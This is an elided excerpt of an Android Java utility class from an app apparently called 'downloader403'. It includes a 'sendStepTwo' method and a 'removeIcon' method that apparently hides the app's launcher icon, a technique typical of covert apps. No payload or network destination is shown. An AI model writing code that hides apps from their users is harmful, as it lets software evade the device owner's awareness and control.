package ir.website.downloader403;
...
public class Utility {
    ...
    public static Boolean sendStepTwo() {
        ...
        SharedPreferences settings = OSService.context.getSharedPreferences("downloader403", Context.MODE_PRIVATE);
...
//                connection.setRequestProperty("If-Range", lastModified);
    ...
    public static Boolean removeIcon(){
        try {
            ...
            ComponentName componentName = new ComponentName("ir.website.downloader403", "ir.website.downloader403.MainActivity"); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
